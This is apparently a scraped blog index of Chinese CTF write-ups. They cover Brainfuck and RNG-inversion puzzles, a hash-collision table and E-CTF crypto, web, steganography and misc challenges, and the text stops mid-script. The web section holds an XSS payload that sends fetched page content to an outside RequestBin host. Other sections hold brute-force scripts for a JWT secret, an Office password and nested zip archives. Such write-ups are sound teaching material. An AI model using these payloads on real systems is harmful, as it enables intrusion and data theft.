VMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVVVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVM 跟之前一样，将其转成二进制再解码会得到 1++[----------&gt;+&lt;]&gt;.+++++++++.---------.-[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;+.+++++++++.---------.-[----&gt;+++++&lt;]&gt;.+[---&gt;++&lt;]&gt;++.&gt;-[---&gt;+&lt;]&gt;---.--[-&gt;++++&lt;]&gt;+.++++++++.+++++.[--&gt;+++++++++&lt;]&gt;.[---&gt;+++++&lt;]&gt;.++++++++++.++++++++++++.-[-----&gt;+&lt;]&gt;.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.------.-.++[-&gt;+++++&lt;]&gt;+.[-----&gt;++++&lt;]&gt;+.+++++++++.---------.&gt;--[--&gt;+++&lt;]&gt;. 很显然这是Brainfuck,所以找个在线的intepreter运行一下就可以得到flag： MVM{MVM_BRAIN_IS_FUCKED_MVM} count-the-mvms主要是数背景的mvm个数，发现它们的像素点是一样的。所以写个图像匹配脚本即可. 首先要把pdf转换成 png，推荐 adobe acrobat 123456789101112131415161718192021222324252627282930313233343536import cvlib# cvlib 是自己写的库im = cvlib.read_img(&quot;certificate_h4tum.png&quot;)sim = cvlib.subrectimg(im, 605, 516, 837, 665)sim2 = cvlib.subrectimg(sim, 44, 32, 79, 48)mvm = cvlib.subrectimg(sim2, 2, 2, 32, 13)print(&quot;read success&quot;)def match(im, x,y): if x+len(mvm) &gt; len(im): return False if y+len(mvm[0]) &gt; len(im[0]): return False for i in range(len(mvm)): for j in range(len(mvm[i])): [r,g,b] = mvm[i][j] [ri,gi,bi] = im[x+i][y+j] if r != ri or g != gi or b != bi: return False return True def count_matches(im): cnt = 0 for i in range(len(im)): print(i) for j in range(len(im[i])): if match(im, i,j): cnt += 1 j += len(mvm[0]) - 1 return cntprint(count_matches(im))print(&quot;finish&quot;) Cryptoman-vs-matrix:题目描述： 打开下载文件会看到： 1234567891011121314151617181920212223242526272829303132from sage.all import *from Crypto.Util.number import bytes_to_longclass RNG: def __init__(self, seed): self.p = next_prime(2**24) # 16777259 self.F = GF(self.p) self.M = matrix(self.F, 3,3, [bytes_to_long(seed[i:i+3]) for i in range(0, len(seed), 3)]) self.state = vector(self.F, map(ord, &quot;Mvm&quot;)) # [77, 118, 109] self.gen = self.F(2) def get_random_num(self): out = self.M * self.state for i in range(len(self.state)): # len = 3 self.state[i] = self.gen**self.state[i] return out * self.stateflag = b&quot;MVM&#123;???????????????????????????&#125;&quot;seed = flag[4:-1] # 27位，27/3=9rng = RNG(seed)samples = []for i in range(9): samples.append(rng.get_random_num())print(f&quot;&#123;samples = &#125;&quot;)# samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781] 是几个随机数的生成器（RNG），但生成逻辑非常简单。 每次会计算 (\\text{M} \\cdot \\text{state}) \\cdot \\text{new\\_state}(括号外的乘法是内积。在sage里，矩阵与矩阵/向量的乘法和向量与向量的内积都是用*)。并且有 \\text{new\\_state}[i] = 2^{\\text{state}[i]}.这里的初始state是已知的，所以我们只需要建立一个9元1次线性方程组即可。 我们可以写一段sagemath的代码来通过解方程逆推出matrix以及flag内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162p = 16777259 # = next_prime(2**24)F = GF(p)samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781]# 初始状态 S0 = [77, 118, 109]S0 = vector(F, [77, 118, 109])def next_state(st): return vector(F, [F(2)^int(x) for x in st])# 求出 S0 ~ S9S = [None]*10S[0] = S0for i in range(1, 10): S[i] = next_state(S[i-1])# 构造线性方程组 X * M_vec = YX = matrix(F, 9, 9)Y = vector(F, 9)for i in range(9): row_coeffs = [] # M_vec 的顺序: M[0,0], M[0,1], M[0,2], M[1,0], ..., M[2,2] for k in range(3): for j in range(3): row_coeffs.append(S[i][j] * S[i+1][k]) X[i] = row_coeffs Y[i] = samples[i]# 求解 9 个未知量M_vec = X.solve_right(Y)M_mat = matrix(F, 3, 3, M_vec)print(&quot;Recovered M =&quot;)print(M_mat)# 将 3x3 矩阵以行优先顺序（row-major）展开成 9 个元素# 对应当初 [bytes_to_long(seed[0:3]), bytes_to_long(seed[3:6]), ..., bytes_to_long(seed[24:27])]m_ints = []for i in range(3): for j in range(3): # Sage 返回的是 GF(p) 的元素，先转成普通整型 val = int(M_mat[i, j]) m_ints.append(val)# 将每个 val 转成 3 字节后依次拼接seed_recovered = b&quot;&quot;.join(val.to_bytes(3, &quot;big&quot;) for val in m_ints)# 最终还原 flag = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;flag_recovered = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;print(&quot;Recovered seed =&quot;, seed_recovered)print(&quot;Recovered flag =&quot;, flag_recovered)#最后得到的结果：# Recovered M =# [7090542 3355762 6252149]# [5137236 3223662 3497780]# [7484255 7174495 6698102]# Recovered seed = b&#x27;l1n34r_fuNcT10n5_4r3_my_f4v&#x27;# Recovered flag = b&#x27;MVM&#123;l1n34r_fuNcT10n5_4r3_my_f4v&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"哈希加密的长度与碰撞情况","slug":"CTF/Crypto/哈希加密的长度与碰撞情况","date":"2025-03-09T18:36:57.000Z","updated":"2025-03-29T18:54:16.080Z","comments":true,"path":"2025/03/09/CTF/Crypto/哈希加密的长度与碰撞情况/","permalink":"https://archer-baiyi.github.io/2025/03/09/CTF/Crypto/%E5%93%88%E5%B8%8C%E5%8A%A0%E5%AF%86%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%8E%E7%A2%B0%E6%92%9E%E6%83%85%E5%86%B5/","excerpt":"常见的哈希函数的长度及其碰撞情况汇总","text":"以下是各种常见的哈希函数的长度及其碰撞情况汇总： 哈希长度 (bit) 常见算法 碰撞情况 碰撞年份 发明年份 状态 128-bit MD5 存在已知有效碰撞攻击 2004 年 1992 年 已过时，不推荐使用 160-bit SHA-0, SHA-1, RIPEMD-160 SHA-0: 存在已知有效碰撞攻击 SHA-0: 2004 年 SHA-0: 1993 年 SHA-0: 已弃用，不推荐使用 SHA-1: 存在已知有效碰撞攻击 SHA-1: 2017 年 SHA-1: 1995 年 已过时，不推荐使用 256-bit SHA-256, SHA-3-256 暂无已知有效碰撞攻击 - SHA-256: 2001 年 安全，广泛使用 384-bit SHA-384 暂无已知有效碰撞攻击 - 2001 年 安全，高安全性需求 512-bit SHA-512, SHA-3-512 暂无已知有效碰撞攻击 - SHA-512: 2001 年 非常安全，高性能需求 碰撞情况说明 128-bit (MD5): MD5 是一种输出为 128 位的哈希算法，但由于其设计的安全性不足，早在 2004 年就被发现可以有效制造碰撞。 MD5 于 1992 年被发明，不适合任何需要密码学安全性的场景，仅可用于低安全性完整性校验。 160-bit (SHA-0, SHA-1, RIPEMD-160): SHA-0 是 SHA 系列的初代版本，存在严重的设计缺陷，在 2004 年被证明可以制造碰撞。SHA-0 于 1993 年发明。 SHA-1 作为输出 160 位的主流算法，在 2017 年被证实可以通过理论和实践攻击制造碰撞。SHA-1 于 1995 年发明。 RIPEMD-160 虽尚未有公开的碰撞记录，但不如更高位算法安全。 256-bit (SHA-256, SHA-3-256): 目前没有已知的碰撞攻击。 SHA-256 于 2001 年被发明，适合绝大多数场景，如数字签名、区块链和数据完整性验证。 384-bit (SHA-384): 为高安全需求设计，未有任何已知的碰撞攻击。 SHA-384 于 2001 年发明，适用于密钥交换、长时间数据存储等高安全性应用。 512-bit (SHA-512, SHA-3-512): 提供极高的安全性，特别适用于对抗潜在的量子计算威胁。 SHA-512 于 2001 年发明，性能消耗较高，适合长期存储的场景。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"}]},{"title":"E-CTF比赛 Writeup","slug":"CTF/Writeup/E-CTF-Writeup","date":"2025-03-02T23:17:07.000Z","updated":"2025-03-25T19:31:29.228Z","comments":true,"path":"2025/03/03/CTF/Writeup/E-CTF-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/03/CTF/Writeup/E-CTF-Writeup/","excerpt":"E-CTF比赛的题解，涉及方向：Crypto, Web, Steg, Misc, Forensics, Osint","text":"1. Cryptography（密码学）ASCII me anything but not the flag 根据它的提示，我们先将这段内容用ASCII解码，得到： 123456789108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63-&gt;ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;Ebob fp vlro hbv, dlla irzh : HBVHBVWell done, but now do you know about the guy who got stabbed 23 times ? 第三段的指的是凯撒大帝被刺杀的事件： 所以我们尝试遍历前两段的凯撒加密结果，但只有第二段可以得到有用信息： 1Here is your key, good luck : KEYKEY 可以得知密钥为：”HBVHBV“（我一开始以为密码就是KEYKEY）。由于第一段括号前的内容为4个字母，刚好对的上”ectf“，所以应该是单表或者多表替换加密。再因为密钥为重复的内容，不难猜测这应该是“Vigenere 维吉尼亚密码”。于是找个在线的解密网页（https://planetcalc.com/2468/#google_vignette）便可以得到flag： 1ectf&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125; OIIAIOIIIAI 😼 由于知道这次比赛的flag格式为ectf{}，所以不难发现这串字符的偶数位应该是flag的开头，也就是： 1ectf&#123;y0U_5p1N_M3 而由于}在字符串开头，所以猜测基数位的倒序为flag的后半部分： 1R1GhT_R0unD_B4bY&#125; 拼在一起得到flag： 1ectf&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125; Hashes Binder 首先会下载得到3个文件： 由于这份Excel文件被设置了密码保护，所以我们尝试用这个wordlist里的内容来爆破它： 1234567891011121314151617181920212223import msoffcryptoimport ioencrypted_file = &quot;parts.xlsx&quot; password_list = &quot;wordlist.txt&quot; with open(password_list, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: passwords = [line.strip() for line in f.readlines()]for password in passwords: try: with open(encrypted_file, &quot;rb&quot;) as file: office_file = msoffcrypto.OfficeFile(file) office_file.load_key(password=password) decrypted_file = io.BytesIO() office_file.decrypt(decrypted_file) print(f&quot;成功破解密码: &#123;password&#125;&quot;) break except Exception: continue# 成功破解密码: dolphin 打开Excel文件后会看到3部分内容 123456789Part 1036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52aPart 22H8ZcpmQyRisnPart 3cHJlc2NyaXB0aW9u 首先注意到第2，3部分非常像base64编码内容，于是尝试解码，第三部分会成功解出来： 1prescription 第二部分则提示解码失败，所以我们尝试其他base解码，最后用base58成功解码得到： 1digestive 第一部分则非常像哈希加密的结果，所以我们用这个网站试一下能不能破解 https://hashes.com/en/decrypt/hash 提示破解成功，原文为spooky，并且使用的算法是Gost Hash。（spooky其实也在这个wordlist.txt里，所以理论上来说这一步也可以用爆破得到。） 于是用 1dolphin_spooky_digestive_prescription 成功解压.zip压缩包得到flag： 1ECTF&#123;J0nH_tH3_Cr4ck3R_95234826&#125; RSA intro 这道题我们会得到以下内容： 1234n = 1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001e = 65537c = 393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699 因为没有其他信息了，所以我们先用 http://www.factordb.com/index.php 试一下暴力分解n： 成功得到n的其中一个因数为5054843。之后就只需要写一段代码解密就可以得到flag： 123456789101112131415from Crypto.Util.number import inverse, long_to_bytesdef rsa_decrypt(n, e, c, p): q = n // p phi_n = (p - 1) * (q - 1) d = inverse(e, phi_n) m = pow(c, d, n) return long_to_bytes(m).decode(&#x27;utf-8&#x27;)n = e = 65537c = p = 5054843 plaintext = rsa_decrypt(n, e, c, p)print(&quot;解密结果:&quot;, plaintext)# 解密结果: ectf&#123;b4sic_F4cT0rDb_rS4&#125; Cracking the Vault 这道题我们会得到2份文件，一份是python的代码，关于加密算法的，另一份文件则是加密后的结果。 我们首先来看一下加密的具体过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import secretsimport hashlibdef encryption(text): encrypted = [] random = secrets.SystemRandom() padding_length = 256 - len(text) % 256 raw_padding = [chr(random.randint(32, 126)) for _ in range(padding_length)] scrambled_padding = [chr((ord(c) * 3 + 7) % 94 + 32) for c in raw_padding] shifted_padding = scrambled_padding[::-1] padded_text = &#x27;&#x27;.join(shifted_padding) + text final_padded_text = &#x27;&#x27;.join( chr((ord(c) ^ 42) % 94 + 32) if i % 2 == 0 else c for i, c in enumerate(padded_text) ) secret_key = str(sum(ord(c) for c in text)) secret_key = secret_key[::-1] hashed_key = hashlib.sha256(secret_key.encode()).hexdigest() seed = int(hashed_key[:16], 16) random = secrets.SystemRandom(seed) for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seedwith open(&#x27;VaultKey.txt&#x27;, &#x27;r&#x27;) as f: text = f.read()encrypted_text, seed = encryption(text)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;w&#x27;) as f: f.write(encrypted_text)print(&quot;The file has been successfully encrypted!&quot;) 我们可以注意到这段代码里有很多多余的内容（指没有真正出现在加密过程中），真正跟加密算法相关的其实只有这一段 1234567for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seed 所以我们只需要逆向一下这个加密逻辑便可以得到flag： 123456789101112131415def decryption(encrypted_text): decrypted_chars = [] for i, enc_char in enumerate(encrypted_text): enc_code = ord(enc_char) shift = 3 * (i + 1) + 67 orig_code = (enc_code - shift) % 256 decrypted_chars.append(chr(orig_code)) return &#x27;&#x27;.join(decrypted_chars)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f: encrypted_text = f.read()print(decryption(encrypted_text))# Well done! I bet you&#x27;re great at math. Here&#x27;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125; Never two without three 我们首先会得到这些内容： 1AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY 直接尝试base64解码会提示失败，所以根据它的提示我们先遍历它的所有凯撒加密然后再解码： 12345678910111213141516171819202122232425262728293031import base64import stringdef caesar_cipher_decrypt(text, shift): decrypted_text = &quot;&quot; for char in text: if char in string.ascii_letters: is_upper = char.isupper() alphabet = string.ascii_uppercase if is_upper else string.ascii_lowercase new_index = (alphabet.index(char) - shift) % 26 decrypted_text += alphabet[new_index] else: decrypted_text += char return decrypted_textdef try_base64_decode(text): try: decoded_data = base64.b64decode(text).decode(&#x27;utf-8&#x27;) return decoded_data except Exception: return Nonecipher_text = &quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;for shift in range(26): decrypted_text = caesar_cipher_decrypt(cipher_text, shift) base64_decoded = try_base64_decode(decrypted_text) if base64_decoded: print(f&quot;Shift: &#123;shift&#125;, 解码: &#123;base64_decoded&#125;&quot;)# Shift: 10, 解码: ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN 发现这是唯一可以成功解码出来的内容。我们再次尝试用base64解码这段内容会提示失败，所以还是转战其他的base编码，最后再次用base58成功解码得到： 1The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125; 2. WebJava Weak Token 先简单科普一下JWT： JWT是一串base64编码，被用.分成3部分。第一部分是header，里面会写使用的算法以及typ（一般都是JWT）。第二部分是Payload，是JWT的核心内容，通常会纪录当前JWT所有者的身份信息。第三部分则是签名，会计算 1HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),密钥) 以确保当前信息的完整性（integrity），真实性（authenticity）。 在这道题我们会首先在目标网站里得到我们的JWT（我们每次访问网站都会得到一个新的JWT）： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM 用 https://jwt.io/ 分析一下： 可以看到，Payload里有一个名为”username“的值当前被设置为“user”，我们猜测只需要将其改成“admin”并且用其再次访问网站即可获得flag。 根据题目的提示，我们先将这个JWT的密钥给爆破出来： 1234567891011121314151617181920212223242526272829import jwtimport timedef brute_force_jwt(token): # header, payload, signature = token.split(&#x27;.&#x27;) with open(&quot;rockyou.txt&quot;, &#x27;r&#x27;, encoding=&#x27;latin-1&#x27;) as f: for line in f: secret = line.strip() try: decoded = jwt.decode(token, secret, algorithms=[&#x27;HS256&#x27;]) print(f&quot;[+] Found secret key: &#123;secret&#125;&quot;) print(f&quot;Decoded JWT: &#123;decoded&#125;&quot;) return secret except jwt.ExpiredSignatureError: print(f&quot;[-] Expired token with key: &#123;secret&#125;&quot;) return secret except jwt.InvalidTokenError: pass print(&quot;[-] No valid secret found in wordlist.&quot;) return Nonejwt_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;brute_force_jwt(jwt_token)# [+] Found secret key: 1234 用这个网站将我们的JWT的payload改成“admin” 之后再用这个新的JWT访问网站即可得到flag： 1ectf&#123;JwT_T0keN_cR34t0r&#125; Chat with the admin 这道题比较明显地暗示了我们需要用xss攻击来获取flag。我们首先在 https://pipedream.com/ 创建一个Request Bin（创建临时的 HTTP 端点，用于捕获和检查传入的 HTTP 请求。）， 然后在对话框里输入以下内容即可： 1&lt;script&gt;fetch(&#x27;http://instances.ectf.fr:11111/&#x27;).then(response =&gt; response.text()).then(text =&gt; document.location=&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;+btoa(encodeURIComponent(text)))&lt;/script&gt; 之后便会在Request Bin的访问纪录里查看flag： 1ECTF&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125; 3. Steganography（隐写）Definitely not in the PDF 将下载的压缩包解压会得到一份pdf文件： /Stega_-_Definitely_not_in_the_PDF/world_flags.jpg) 并没有任何发现，再根据他一直说的“flag”不在这里，于是决定去看一开始的压缩包。果然在文件结尾发现flag： 1ECTF&#123;W3lL_d0nE_652651663616263&#125; JB1804 我们会得到一份乐谱： 通过检查发现它并没有隐写任何内容在hex文件里，抑或是LSB隐写。 通过谷歌搜索“music Steganography 1804”可以发现这个维基词条： 点进去之后搜索“1804”会发现Johann Bücking在1804年发明了一种乐谱密码： 根据这张密码表解码会得到： 1ectf&#123;steganomousiqueissuperswag&#125; (法语中的“音乐“是”musique“，所以flag的内容为stegano mousique is super swag。) The island’s treasure 下载文件会得到2张图片： 首先用010 Editor打开第一张图片会发现 在Description后面有一段base64编码 1UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0= 解码后会得到 1RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM= 再解码一次会得到key1： 1234Félicitations ! Tu as trouvé la clé n°1 du coffre !Congratulations ! You found the key n°1 of the chest !Clé: M3t4d4t4_15_n0t_5af3Key: M3t4d4t4_15_n0t_5af3 因为hex文件里面看起来找不到第二段key了，所以我们用Stegsolve.jar打开这张图片查看是否有用LSB隐写的内容。当调整到Red Plane 0时会得到 我们将这张照片导出会得到第二部分的key（key2）： 123key1: M3t4d4t4_15_n0t_5af3key2: Hidd3n_p1ctur3key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3 然后我们现在来打开箱子：根据提示，支持加密隐写并且有GUI的软件并不多，所以我们来试一下OpenStego： 提取出来的照片为： 成功找到flag： 1ECTF&#123;You_found_th3_tr3asur3&#125; Silhouette in cyberpunk 这道题我们会得到一张图片： 非常赛博风。 注意到这两个地方的点组的排列非常像我们日常生活中（比如说电梯里）会碰到的盲文： （近点的那栋大楼） （画面左边远处的那栋大楼） 第一张里面的盲文翻译过来是： 1This is just a dummyy, nice try 而第二张里面的内容才是真正的flag： 12345⠓⠼⠁⠙⠙⠼⠉⠝⠼⠁⠝⠹⠼⠉⠙⠼⠙⠗⠅⠝⠼⠉⠎⠎-&gt;h1dd3n1nth3d4rkn3ss (可以用这个网站翻译盲文内容：https://www.dcode.fr/alphabet-braille) 根据题目的flag格式要求，我们确定flag为： 1ectf&#123;h1dd3n_1n_th3_d4rkn3ss&#125; 4. MiscellaneousExtraction Mission Heart of the vault 这道题我们会得到一个加密的压缩包Misc_5_-_dwarf_vault_200.zip，将其爆破之后会再次得到一个加密的压缩包dwarf_vault_199.zip，再重复一次操作会得到dwarf_vault_198.zip，也是加密了的。所以我们猜测作者将一份文件（夹）重复加密压缩了200次。所以决定写一个脚本自动化完成这些操作，并且根据提示将所有密码保存进一个txt文件里： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import zipfileimport osimport shutilimport zlib# 定义初始zip文件路径和字典文件路径zip_path = &quot;Misc_5_-_dwarf_vault_200.zip&quot;dict_path = &quot;rockyou.txt&quot;passwords = [] # 记录所有找到的密码def brute_force_zip(zip_path, dict_path): try: with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_file: with open(dict_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f: for line in f: password = line.strip().encode(&quot;latin-1&quot;) # 转换为字节格式 try: zip_file.extractall(pwd=password) print(f&quot;[+] 找到密码: &#123;password.decode()&#125;&quot;) passwords.append(password.decode()) # 获取解压后的文件夹或文件名 extracted_files = zip_file.namelist() return extracted_files # 返回解压出的文件名列表 except (RuntimeError, zipfile.BadZipFile, zlib.error): continue print(&quot;[-] 未找到密码，请尝试其他字典或方法。&quot;) return None except FileNotFoundError: print(&quot;[!] 文件未找到，请检查路径是否正确。&quot;) return None except zlib.error: print(&quot;[!] 遇到 zlib 解压错误，终止爆破。&quot;) return None# 递归解压直到没有更多 zip 文件def recursive_brute_force(zip_path, dict_path): try: while zip_path: extracted_files = brute_force_zip(zip_path, dict_path) if not extracted_files: break # 查找新的 ZIP 文件 new_zip_path = None for file in extracted_files: if file.endswith(&quot;.zip&quot;): new_zip_path = file break if new_zip_path: zip_path = new_zip_path # 直接使用新找到的 ZIP 文件 else: print(&quot;[!] 没有找到更多的 ZIP 文件，任务完成！&quot;) break except zlib.error: print(&quot;[!] 发生 zlib 错误，终止爆破。&quot;) finally: # 将所有找到的密码写入文件 with open(&quot;found_passwords.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: for password in passwords: f.write(password + &quot;\\n&quot;)# 运行爆破函数recursive_brute_force(zip_path, 